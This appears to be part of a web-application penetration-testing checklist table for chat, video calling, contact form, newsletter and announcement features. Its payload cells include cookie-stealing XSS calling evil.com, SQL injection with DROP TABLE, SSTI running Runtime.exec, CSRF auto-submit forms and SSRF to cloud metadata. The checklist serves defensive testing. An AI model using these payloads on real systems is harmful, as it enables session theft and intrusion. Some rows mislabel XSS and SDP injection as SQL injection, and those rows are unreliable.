| COMM-085 | Stored XSS in Chat Messages | Cross-Site Scripting (WSTG-INPV-02) | Chat / Messaging | 1. Send a chat message containing XSS payload.<br>2. Wait for the recipient to view the message.<br>3. Check if the script executes in the recipient's browser.<br>4. Test in different rendering contexts. | Application must sanitize all chat message content on input and encode on output to prevent stored XSS in messaging. | <code>message=&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;;message=&lt;img src=x onerror=alert(1)&gt;;message=&lt;svg/onload=alert(document.domain)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-086 | Chat Message IDOR | Broken Access Control (WSTG-AUTHZ-04) | Chat / Messaging | 1. Access own chat messages.<br>2. Change conversation_id or message_id to another user's conversation.<br>3. Check if messages from other conversations are accessible. | Application must verify that the authenticated user is a participant in the conversation before displaying any messages. | <code>GET /api/chat/conversations/CONV-2001/messages with non-participant credentials;GET /api/chat/messages/MSG-2001</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-087 | Chat Message Injection for Impersonation | Broken Access Control (WSTG-AUTHZ-02) | Chat / Messaging | 1. Send a chat message.<br>2. Intercept and modify the sender_id or from_user parameter.<br>3. Check if the message appears to come from another user.<br>4. Test message spoofing. | Application must determine the message sender from the authenticated session server-side and not accept client-provided sender identifiers. | <code>Change sender_id=1001 to sender_id=1002 in POST /api/chat/send or modify from_user field</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-088 | Chat File Upload Malware | File Upload (WSTG-INPV-12) | Chat / Messaging | 1. Upload a file via chat.<br>2. Attempt to upload executable files or web shells disguised as images or documents.<br>3. Check file type validation.<br>4. Try to access and execute the uploaded file. | Application must validate file content type and scan for malware and store uploads outside web root without execute permissions. | <code>Upload shell.php.jpg;malware.exe.pdf;polyglot.jpg containing PHP code;file with double extension test.html.png</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;ClamAV;Custom Scripts | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| COMM-089 | Chat History Unauthorized Access | Broken Access Control (WSTG-AUTHZ-04) | Chat / Messaging | 1. Attempt to access chat history between two other users.<br>2. Enumerate conversation IDs.<br>3. Try admin chat history endpoints with regular user credentials. | Application must enforce strict access control on chat history ensuring only conversation participants can access their messages. | <code>GET /api/chat/history?between=1002&amp;and=1003 with User A credentials;enumerate conversation IDs CONV-0001 to CONV-9999</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-090 | Chat Message SQL Injection | Injection (WSTG-INPV-05) | Chat / Messaging | 1. Send a chat message with SQL injection payload.<br>2. Search chat messages using SQL injection in the search query.<br>3. Observe responses for SQL errors or data leakage. | Application must use parameterized queries for all chat message storage and retrieval operations. | <code>message=test' OR 1=1--;search_query=' UNION SELECT username;password FROM users--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-091 | Chat WebSocket Eavesdropping | Information Disclosure (WSTG-INFO-05) | Chat / Messaging | 1. If chat uses WebSocket connect to the WebSocket endpoint.<br>2. Try subscribing to other users' chat channels.<br>3. Check if messages from private conversations are visible. | Application must enforce channel-level authorization on chat WebSocket connections preventing eavesdropping. | <code>Connect to ws://target.com/chat/ws and subscribe to channel=private_chat_1002_1003 without being a participant</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;Custom Scripts | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-092 | Chat Rate Limiting Bypass | Business Logic (WSTG-BUSL-05) | Chat / Messaging | 1. Send chat messages at very high frequency.<br>2. Check for rate limiting.<br>3. Attempt to bypass rate limits using multiple connections or header manipulation.<br>4. Test for spam potential. | Application must implement rate limiting on chat messages to prevent spam and abuse. | <code>Send 100+ messages per second;bypass with X-Forwarded-For rotation;open multiple WebSocket connections</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-093 | Chat Message Deletion IDOR | Broken Access Control (WSTG-AUTHZ-04) | Chat / Messaging | 1. Delete own chat message.<br>2. Intercept and change message_id to another user's message.<br>3. Check if the other user's message is deleted. | Application must verify that the authenticated user is the author of a message before allowing deletion. | <code>DELETE /api/chat/messages/MSG-2001 with non-author credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-094 | Chat CRLF Injection | Injection (WSTG-INPV-15) | Chat / Messaging | 1. Send chat messages containing CRLF characters.<br>2. Check if headers are injected in HTTP responses or if log injection occurs.<br>3. Test for HTTP response splitting. | Application must strip CRLF characters from all chat message inputs. | <code>message=Hello%0d%0aSet-Cookie:session=evil%0d%0a;message=test%0d%0aHTTP/1.1 200 OK%0d%0a</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Custom Scripts | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| COMM-095 | Chat Encryption Verification | Cryptography (WSTG-CRYP-01) | Chat / Messaging | 1. Capture chat traffic.<br>2. Verify if messages are encrypted in transit.<br>3. Check if end-to-end encryption is implemented when claimed.<br>4. Test for encryption downgrade attacks. | Chat messages must be encrypted in transit using TLS and if E2E encryption is claimed it must be verifiable and properly implemented. | <code>Capture WebSocket traffic and check for plain-text messages;attempt TLS stripping;verify E2E encryption claims</code> | Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Wireshark;Burp Suite;mitmproxy | CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP |
| COMM-096 | Chat Link Preview SSRF | SSRF (WSTG-INPV-19) | Chat / Messaging | 1. Send a chat message containing a URL.<br>2. If the application generates link previews check if it fetches the URL server-side.<br>3. Send internal URLs to test for SSRF. | Application must validate and restrict URLs used for link preview generation blocking access to internal network addresses. | <code>message=Check this: http://169.254.169.254/latest/meta-data/ or message=http://localhost:8080/admin</code> | SSRF -&gt; internal-service reach / cloud metadata credential theft. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Collaborator | CWE-918; [SSRF kit](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger |
| COMM-097 | Chat Markdown/BBCode Injection | Injection (WSTG-INPV-01) | Chat / Messaging | 1. If chat supports Markdown or BBCode formatting inject malicious markup.<br>2. Test for XSS through Markdown rendering.<br>3. Check for link injection or image injection. | Application must safely render Markdown or BBCode and prevent XSS through formatting injection. | <code>[url=javascript:alert(1)]Click[/url];![img](javascript:alert(1));[Click](javascript:alert(document.cookie))</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Browser | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-098 | Video Call Authentication Bypass | Authentication (WSTG-ATHN-01) | Video Calling | 1. Capture a video call initiation request.<br>2. Remove authentication tokens.<br>3. Attempt to join a call without valid credentials.<br>4. Check if unauthenticated users can access video calls. | Application must require valid authentication for initiating and joining video calls. | <code>Join ws://target.com/video/room/ROOM-1001 or POST /api/video/join/ROOM-1001 without authentication</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;wscat;Postman | CWE-640; [Account Takeover kit](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| COMM-099 | Video Call Room ID Enumeration | Information Disclosure (WSTG-INFO-04) | Video Calling | 1. Note the format of video call room IDs.<br>2. Enumerate sequential or predictable room IDs.<br>3. Attempt to join active calls by guessing room IDs. | Application must use cryptographically random room identifiers and require invitation or authorization to join calls. | <code>Enumerate /api/video/join/ROOM-0001 through ROOM-9999;try joining discovered active rooms</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite Intruder;ffuf | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| COMM-100 | Unauthorized Video Call Recording Access | Broken Access Control (WSTG-AUTHZ-04) | Video Calling | 1. If call recording exists access own call recordings.<br>2. Change recording_id or call_id to access other users' recordings.<br>3. Check for IDOR on recording download. | Application must verify that the user was a participant in the call before allowing access to recordings. | <code>GET /api/video/recordings/REC-2001 with non-participant credentials;enumerate recording IDs</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-101 | Video Call Eavesdropping via WebRTC | Information Disclosure (WSTG-INFO-05) | Video Calling | 1. Analyze WebRTC signaling messages.<br>2. Check if SRTP is enforced for media streams.<br>3. Test for SRTP-to-RTP downgrade attacks.<br>4. Verify TURN/STUN server security. | Video calls must use SRTP encryption for all media streams and prevent downgrade attacks with properly secured signaling. | <code>Capture SDP offers and check for m=audio RTP/SAVPF vs RTP/AVP;test TURN server with leaked credentials</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Wireshark;WebRTC Internals;Burp Suite | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-102 | Video Call CSRF for Auto-Answer | CSRF (WSTG-SESS-05) | Video Calling | 1. Craft a malicious page that initiates or auto-accepts a video call to the victim.<br>2. Lure victim to visit.<br>3. Check if the call is established without victim's explicit consent. | Application must require explicit user action to accept video calls and implement CSRF protection on call acceptance. | <code>&lt;script&gt;fetch('https://target.com/api/video/accept/CALL-1001',{method:'POST',credentials:'include'})&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-103 | IP Address Leakage via WebRTC | Information Disclosure (WSTG-CLNT-01) | Video Calling | 1. Initiate a video call.<br>2. Check WebRTC ICE candidates for IP address leakage.<br>3. Verify if local and public IP addresses are exposed through signaling.<br>4. Check if TURN relay is enforced. | Application must use TURN relay servers to prevent direct IP leakage between call participants when privacy is required. | <code>Check WebRTC ICE candidates for candidate:... typ host with local IP;candidate:... typ srflx with public IP</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser DevTools;WebRTC Internals | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-104 | Video Call Link Sharing Vulnerability | Broken Access Control (WSTG-AUTHZ-02) | Video Calling | 1. Generate a video call link.<br>2. Share the link without authentication.<br>3. Check if anyone with the link can join without being invited.<br>4. Test for link expiration. | Application must require authentication and authorization for video call access even when using shareable links with proper expiration. | <code>Access video call link https://target.com/video/join/ROOM-TOKEN-ABC from unauthenticated browser</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Browser;Burp Suite | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-105 | Malicious Screen Share Content Injection | Business Logic (WSTG-BUSL-01) | Video Calling | 1. During a video call initiate screen sharing.<br>2. Check if screen share content is validated.<br>3. Test if a user can share misleading or malicious content that appears as system notifications. | Application must clearly identify screen-shared content and prevent it from being confused with system UI elements. | <code>Share screen displaying fake login pages or system dialogs designed to capture credentials from other participants</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Manual Testing;Browser | CWE-840; PortSwigger Business logic |
| COMM-106 | Video Call Signaling Server Injection | Injection (WSTG-INPV-01) | Video Calling | 1. Intercept WebRTC signaling messages.<br>2. Inject malicious SDP parameters or modify ICE candidates.<br>3. Check if injected signaling data causes call disruption or redirection. | Application must validate all signaling messages and SDP parameters to prevent manipulation of call routing. | <code>Modify SDP answer to redirect media stream;inject malicious ICE candidate pointing to attacker TURN server</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;wscat;Custom Scripts | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-107 | XSS in Contact Form Fields | Cross-Site Scripting (WSTG-INPV-02) | Contact Form | 1. Fill out the contact form with XSS payloads in all fields including name and email and subject and message.<br>2. Submit the form.<br>3. Check if payloads execute when admin views submissions. | Application must sanitize all contact form inputs and encode output when rendering submissions in admin panel or email. | <code>name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;subject=&lt;img src=x onerror=alert(1)&gt;;message=&lt;svg/onload=fetch('https://evil.com/'+document.cookie)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-108 | Contact Form SQL Injection | Injection (WSTG-INPV-05) | Contact Form | 1. Submit the contact form with SQL injection payloads in all text fields.<br>2. Observe responses for SQL errors.<br>3. Test both blind and error-based injection. | Application must use parameterized queries for storing and processing contact form submissions. | <code>name=' OR 1=1--;email=test@test.com' UNION SELECT password FROM users--;message='; DROP TABLE contacts;--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-109 | Contact Form CSRF | CSRF (WSTG-SESS-05) | Contact Form | 1. Craft a malicious page that auto-submits the contact form on behalf of the victim.<br>2. Pre-fill with attacker's message content.<br>3. Lure victim to visit.<br>4. Check if form is submitted. | Application must implement CSRF protection on the contact form even for unauthenticated submissions. | <code>&lt;form action='https://target.com/api/contact' method='POST'&gt;&lt;input name='name' value='Victim'&gt;&lt;input name='message' value='Spam'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-110 | Contact Form Email Header Injection | Injection (WSTG-INPV-11) | Contact Form | 1. Submit the contact form with CRLF injection in the email field.<br>2. Inject additional email headers.<br>3. Check if the form is used as a mail relay to send spam. | Application must sanitize the email field and prevent any header injection in the contact form email processing. | <code>email=user@test.com%0d%0aCc:spam1@test.com%0d%0aBcc:spam2@test.com;email=user@test.com\r\nSubject:Spam</code> | CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;SMTP Tester | CWE-113; [Host Header kit](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger |
| COMM-111 | Contact Form Rate Limiting Bypass | Business Logic (WSTG-BUSL-05) | Contact Form | 1. Submit the contact form rapidly many times.<br>2. Check for rate limiting or CAPTCHA.<br>3. Attempt to bypass rate limits using header manipulation or distributed requests. | Application must implement rate limiting and CAPTCHA on the contact form to prevent spam and abuse. | <code>Send 500+ POST /api/contact submissions;bypass rate limit with X-Forwarded-For header rotation</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-112 | Contact Form File Upload Vulnerability | File Upload (WSTG-INPV-12) | Contact Form | 1. If the contact form allows file attachments upload malicious files.<br>2. Test with web shells and executable files.<br>3. Check file type and content validation.<br>4. Try to access uploaded files. | Application must validate file type by content inspection and scan for malware and store uploads securely outside web root. | <code>Upload shell.php.jpg;test.html;malware.exe.doc;polyglot file with PHP code inside JPEG header</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-434; [File Upload kit](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| COMM-113 | Contact Form CAPTCHA Bypass | Authentication (WSTG-ATHN-08) | Contact Form | 1. Identify the CAPTCHA implementation on the contact form.<br>2. Test for CAPTCHA bypass techniques like reusing tokens or using OCR.<br>3. Check if CAPTCHA validation is server-side. | Application must implement robust CAPTCHA with server-side validation that prevents automated submissions. | <code>Reuse CAPTCHA token;remove CAPTCHA parameter from request;use OCR tools;test with empty CAPTCHA value</code> | Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Tesseract OCR;Custom Scripts | CWE-799; [Account Takeover kit](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger |
| COMM-114 | Sensitive Data Exposure in Contact Form Responses | Information Disclosure (WSTG-ERRH-01) | Contact Form | 1. Submit the contact form with various invalid inputs.<br>2. Check error responses for verbose information.<br>3. Look for stack traces or database details or internal paths. | Application must return generic error messages for contact form validation failures without exposing internal system details. | <code>Submit malformed data and check for stack traces;database connection strings;file paths;framework versions</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-200; [JWT kit](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| COMM-115 | SSTI in Contact Form Auto-Reply | Injection (WSTG-INPV-18) | Contact Form | 1. Submit the contact form with template syntax in the name or message field.<br>2. If an auto-reply email is sent check if template expressions are evaluated.<br>3. Look for computed values. | Application must escape template syntax in user input before including in auto-reply email templates. | <code>name={{7&#42;7}};message=${T(java.lang.Runtime).getRuntime().exec('id')};subject={{config.items()}}</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap;Email Client | CWE-1336; [SSTI kit](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| COMM-116 | Contact Form Stored XSS in Admin Panel | Cross-Site Scripting (WSTG-INPV-02) | Contact Form | 1. Submit the contact form with persistent XSS payloads targeting the admin panel.<br>2. Wait for admin to view submissions.<br>3. Verify if the payload executes in admin context with higher privileges. | Application must encode all contact form data when rendering in the admin panel to prevent privilege escalation via stored XSS. | <code>message=&lt;script&gt;fetch('https://evil.com/admin-steal?cookie='+document.cookie+'&amp;url='+location.href)&lt;/script&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-117 | Newsletter Subscription Without Email Verification | Business Logic (WSTG-BUSL-02) | Newsletter Subscription | 1. Subscribe to the newsletter with an arbitrary email address.<br>2. Check if the subscription is activated without email verification.<br>3. Test if unwanted subscriptions can be forced on others. | Application must implement double opt-in requiring email verification before activating newsletter subscriptions. | <code>POST /api/newsletter/subscribe with email=victim@company.com without any verification step</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| COMM-118 | Newsletter Subscription SQL Injection | Injection (WSTG-INPV-05) | Newsletter Subscription | 1. Use the newsletter subscription form.<br>2. Inject SQL payloads in the email field.<br>3. Observe responses for SQL errors or data extraction. | Application must use parameterized queries for newsletter subscription operations. | <code>email=' OR 1=1--;email=test@test.com' UNION SELECT group_concat(email) FROM subscribers--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; [SQLi kit](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| COMM-119 | Newsletter Email Bombing | Business Logic (WSTG-BUSL-05) | Newsletter Subscription | 1. Subscribe a victim's email to the newsletter.<br>2. Trigger multiple subscription confirmation emails.<br>3. Check for rate limiting.<br>4. Attempt mass subscription with the same email. | Application must implement rate limiting on subscription confirmation emails and prevent repeated subscription attempts for the same email. | <code>Send 1000+ POST /api/newsletter/subscribe with same victim email;script automated subscribe/unsubscribe cycles</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| COMM-120 | Newsletter Subscriber List Enumeration | Information Disclosure (WSTG-INFO-04) | Newsletter Subscription | 1. Check if the subscription status check endpoint reveals whether an email is subscribed.<br>2. Enumerate email addresses against the subscription check.<br>3. Build subscriber list. | Application must not reveal subscription status for arbitrary email addresses to prevent subscriber enumeration. | <code>GET /api/newsletter/status?email=test1@test.com through test10000@test.com and note different responses</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite Intruder;Custom Scripts | CWE-204; [Account Takeover kit](#/checklist/ato); OWASP WSTG-IDNT-04 |
| COMM-121 | Newsletter Unsubscribe IDOR | Broken Access Control (WSTG-AUTHZ-04) | Newsletter Subscription | 1. Unsubscribe from the newsletter using the provided link.<br>2. Modify the subscriber identifier in the URL.<br>3. Check if other users can be unsubscribed without their consent. | Application must use signed or tokenized unsubscribe links that prevent manipulation to unsubscribe other users. | <code>Change /newsletter/unsubscribe?id=SUB-1001 to id=SUB-1002;modify email parameter to victim@test.com</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Browser | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-122 | Newsletter XSS via Email Field | Cross-Site Scripting (WSTG-INPV-02) | Newsletter Subscription | 1. Enter XSS payload in the newsletter email subscription field.<br>2. Submit and check if the payload is reflected on the page or stored in admin subscriber list.<br>3. Check for execution. | Application must validate email format and sanitize all input to prevent XSS through subscription forms. | <code>email="&gt;&lt;script&gt;alert(1)&lt;/script&gt;@test.com;email=test+&lt;img/src=x onerror=alert(1)&gt;@test.com</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
| COMM-123 | Newsletter CSRF Subscription | CSRF (WSTG-SESS-05) | Newsletter Subscription | 1. Craft a malicious page that auto-subscribes the victim's email to newsletters.<br>2. Lure victim to visit.<br>3. Check if subscription occurs without explicit consent. | Application must implement CSRF protection or require explicit confirmation for newsletter subscriptions. | <code>&lt;img src='https://target.com/api/newsletter/subscribe?email=victim@test.com'&gt;;auto-submit form</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; [CSRF kit](#/checklist/csrf); PortSwigger CSRF + SameSite |
| COMM-124 | Newsletter Data Export Authorization | Broken Access Control (WSTG-AUTHZ-02) | Newsletter Subscription | 1. Check for newsletter subscriber export endpoints.<br>2. Attempt to export subscriber data with regular user credentials.<br>3. Look for admin export functionality. | Application must restrict subscriber data export to authorized admin users only. | <code>GET /api/newsletter/subscribers/export;GET /api/admin/newsletter/export with regular user credentials</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;DirBuster | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-125 | Unauthorized Announcement Creation | Broken Access Control (WSTG-AUTHZ-02) | Announcement / Broadcast | 1. As a regular user attempt to create a system announcement or broadcast.<br>2. Access admin announcement endpoints.<br>3. Check if role-based access control is enforced. | Application must restrict announcement and broadcast creation to authorized admin roles only. | <code>POST /api/announcements/create with regular user credentials;POST /api/broadcasts/send with non-admin token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; [IDOR kit](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| COMM-126 | XSS in Announcement Content | Cross-Site Scripting (WSTG-INPV-02) | Announcement / Broadcast | 1. If announcement creation is accessible inject XSS payloads in the announcement title and body.<br>2. Submit the announcement.<br>3. Check if XSS executes for all users viewing the announcement. | Application must sanitize announcement content on input and encode on output to prevent stored XSS affecting all users. | <code>title=&lt;script&gt;alert(document.cookie)&lt;/script&gt;;body=&lt;img src=x onerror=fetch('https://evil.com/'+document.cookie)&gt;;content=&lt;svg/onload=alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp Suite;XSS Hunter | CWE-79; [XSS kit](#/checklist/xss); PortSwigger XSS; Cure53 |
